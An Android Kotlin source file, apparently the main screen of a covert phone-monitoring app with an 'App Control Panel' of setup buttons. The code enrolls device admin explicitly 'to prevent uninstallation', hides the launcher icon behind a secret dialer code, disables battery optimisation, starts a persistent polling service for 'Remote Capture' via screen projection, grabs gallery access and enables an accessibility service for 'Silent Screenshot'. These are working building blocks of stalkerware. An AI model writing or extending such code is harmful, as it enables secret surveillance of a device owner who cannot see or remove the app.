package com.example.myapplication

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import android.text.TextUtils
import android.util.Log
import android.widget.Toast
import androidx.activity.ComponentActivity
import androidx.activity.compose.setContent
import androidx.activity.enableEdgeToEdge
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.Arrangement
import androidx.compose.foundation.layout.Column
import androidx.compose.foundation.layout.Spacer
import androidx.compose.foundation.layout.fillMaxSize
import androidx.compose.foundation.layout.height
import androidx.compose.foundation.layout.padding
import androidx.compose.material3.Button
import androidx.compose.material3.ButtonDefaults
import androidx.compose.material3.Scaffold
import androidx.compose.material3.Text
import androidx.compose.runtime.Composable
import androidx.compose.runtime.getValue
import androidx.compose.runtime.mutableStateOf
import androidx.compose.runtime.setValue
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat
import com.example.myapplication.receivers.MyAdminReceiver
import com.example.myapplication.services.MyAccessibilityService
import com.example.myapplication.services.PersistentService
import com.example.myapplication.ui.theme.MyApplicationTheme

class MainActivity : ComponentActivity() {
    private lateinit var devicePolicyManager: DevicePolicyManager
    private lateinit var adminComponent: ComponentName

    private var isAdminActive by mutableStateOf(false)
    private var isBatteryOptimized by mutableStateOf(false)
    private var isGalleryGranted by mutableStateOf(false)
    private var isAccessibilityEnabled by mutableStateOf(false)
    private var isIconHidden by mutableStateOf(false)

    private val projectionLauncher = registerForActivityResult(ActivityResultContracts.StartActivityForResult()) { result ->
        if (result.resultCode == RESULT_OK && result.data != null) {
            val intent = Intent(this, PersistentService::class.java).apply {
                putExtra("RESULT_CODE", result.resultCode)
                putExtra("DATA", result.data)
                action = "START_POLLING"
            }
            startForegroundService(intent)
            Toast.makeText(this, "Remote Capture Setup Complete!", Toast.LENGTH_SHORT).show()
        }
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Log.d("MainActivity", "onCreate called")
        devicePolicyManager = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
        adminComponent = ComponentName(this, MyAdminReceiver::class.java)

        startPersistentService() // Start service automatically

        enableEdgeToEdge()
        setContent {
            MyApplicationTheme {
                Scaffold(modifier = Modifier.fillMaxSize()) { innerPadding ->
                    ControlPanel(
                        modifier = Modifier.padding(innerPadding),
                        isAdminActive = isAdminActive,
                        isBatteryOptimized = isBatteryOptimized,
                        isGalleryGranted = isGalleryGranted,
                        isAccessibilityEnabled = isAccessibilityEnabled,
                        isIconHidden = isIconHidden,
                        onEnableAdmin = { enableDeviceAdmin() },
                        onHideIcon = { setIconVisibility(false) },
                        onShowIcon = { setIconVisibility(true) },
                        onBatteryOptimization = { requestIgnoreBatteryOptimization() },
                        onTakeScreenshot = { startScreenCapture() },
                        onStartPersistentService = { startPersistentService() },
                        onSetupRemote = { startScreenCapture() },
                        onGrantGallery = { requestGalleryPermission() },
                        onOpenAccessibility = { openAccessibilitySettings() }
                    )
                }
            }
        }
    }

    override fun onResume() {
        super.onResume()
        refreshStates()
    }

    private fun refreshStates() {
        isAdminActive = devicePolicyManager.isAdminActive(adminComponent)
        
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        isBatteryOptimized = pm.isIgnoringBatteryOptimizations(packageName)
        
        val galleryPerm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            android.Manifest.permission.READ_MEDIA_IMAGES
        } else {
            android.Manifest.permission.READ_EXTERNAL_STORAGE
        }
        isGalleryGranted = ContextCompat.checkSelfPermission(this, galleryPerm) == PackageManager.PERMISSION_GRANTED
        
        isAccessibilityEnabled = isAccessibilityServiceEnabled(this, MyAccessibilityService::class.java)
        
        val pkg = packageManager
        val launcherComponent = ComponentName(this, "com.example.myapplication.LauncherActivity")
        isIconHidden = pkg.getComponentEnabledSetting(launcherComponent) == PackageManager.COMPONENT_ENABLED_STATE_DISABLED
    }

    private fun isAccessibilityServiceEnabled(context: Context, service: Class<*>): Boolean {
        val expectedComponentName = ComponentName(context, service)
        val enabledServicesSetting = Settings.Secure.getString(context.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES)
            ?: return false
        val colonSplitter = TextUtils.SimpleStringSplitter(':')
        colonSplitter.setString(enabledServicesSetting)
        while (colonSplitter.hasNext()) {
            val componentNameString = colonSplitter.next()
            val enabledService = ComponentName.unflattenFromString(componentNameString)
            if (enabledService != null && enabledService == expectedComponentName) return true
        }
        return false
    }

    private fun startScreenCapture() {
        val manager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        projectionLauncher.launch(manager.createScreenCaptureIntent())
    }

    private fun startPersistentService() {
        val intent = Intent(this, PersistentService::class.java)
        startForegroundService(intent)
    }

    private fun requestGalleryPermission() {
        val permission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            android.Manifest.permission.READ_MEDIA_IMAGES
        } else {
            android.Manifest.permission.READ_EXTERNAL_STORAGE
        }
        requestPermissions(arrayOf(permission), 1001)
    }

    private fun openAccessibilitySettings() {
        val intent = Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)
        startActivity(intent)
    }

    private fun enableDeviceAdmin() {
        val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
            putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
            putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "This app requires device admin permissions to prevent uninstallation.")
        }
        startActivity(intent)
    }

    private fun setIconVisibility(visible: Boolean) {
        val pkg = packageManager
        val componentName = ComponentName(this, "com.example.myapplication.LauncherActivity")
        val state = if (visible) {
            PackageManager.COMPONENT_ENABLED_STATE_ENABLED
        } else {
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED
        }
        
        pkg.setComponentEnabledSetting(
            componentName,
            state,
            PackageManager.DONT_KILL_APP
        )
        
        val message = if (visible) "Icon shown" else "Icon hidden (Dial *#*#234#*#* to open)"
        Toast.makeText(this, message, Toast.LENGTH_LONG).show()
    }

    private fun requestIgnoreBatteryOptimization() {
        val intent = Intent()
        val packageName = packageName
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            intent.action = Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS
            intent.data = Uri.parse("package:$packageName")
            startActivity(intent)
        } else {
            Toast.makeText(this, "Battery Optimization already disabled", Toast.LENGTH_SHORT).show()
        }
    }
}

@Composable
fun ControlPanel(
    modifier: Modifier = Modifier,
    isAdminActive: Boolean,
    isBatteryOptimized: Boolean,
    isGalleryGranted: Boolean,
    isAccessibilityEnabled: Boolean,
    isIconHidden: Boolean,
    onEnableAdmin: () -> Unit,
    onHideIcon: () -> Unit,
    onShowIcon: () -> Unit,
    onBatteryOptimization: () -> Unit,
    onTakeScreenshot: () -> Unit,
    onStartPersistentService: () -> Unit,
    onSetupRemote: () -> Unit,
    onGrantGallery: () -> Unit,
    onOpenAccessibility: () -> Unit
) {
    val activeColor = Color(0xFF4CAF50) // Green
    val inactiveColor = Color(0xFF2196F3) // Blue

    Column(
        modifier = modifier.fillMaxSize(),
        verticalArrangement = Arrangement.Center,
        horizontalAlignment = Alignment.CenterHorizontally
    ) {
        Text(text = "App Control Panel")
        Spacer(modifier = Modifier.height(20.dp))
        
        Button(
            onClick = onEnableAdmin,
            colors = ButtonDefaults.buttonColors(containerColor = if (isAdminActive) activeColor else inactiveColor)
        ) {
            Text("Enable Device Admin")
        }
        
        Spacer(modifier = Modifier.height(10.dp))
        
        Button(
            onClick = onBatteryOptimization,
            colors = ButtonDefaults.buttonColors(containerColor = if (isBatteryOptimized) activeColor else inactiveColor)
        ) {
            Text("Disable Battery Optimization")
        }
        
        Spacer(modifier = Modifier.height(10.dp))
        
        Button(
            onClick = onSetupRemote,
            colors = ButtonDefaults.buttonColors(containerColor = inactiveColor)
        ) {
            Text("Setup Remote Capture")
        }
        
        Spacer(modifier = Modifier.height(10.dp))
        
        Button(
            onClick = onGrantGallery,
            colors = ButtonDefaults.buttonColors(containerColor = if (isGalleryGranted) activeColor else inactiveColor)
        ) {
            Text("Grant Gallery Permission")
        }
        
        Spacer(modifier = Modifier.height(10.dp))
        
        Button(
            onClick = onOpenAccessibility,
            colors = ButtonDefaults.buttonColors(containerColor = if (isAccessibilityEnabled) activeColor else inactiveColor)
        ) {
            Text("Enable Accessibility (Silent Screenshot)")
        }
        
        Spacer(modifier = Modifier.height(10.dp))
        
        Button(
            onClick = onHideIcon,
            colors = ButtonDefaults.buttonColors(containerColor = if (isIconHidden) activeColor else inactiveColor)
        ) {
            Text("Hide App Icon")
        }
        
        Spacer(modifier = Modifier.height(10.dp))
        
        Button(
            onClick = onShowIcon,
            colors = ButtonDefaults.buttonColors(containerColor = if (!isIconHidden) activeColor else inactiveColor)
        ) {
            Text("Show App Icon")
        }
    }
}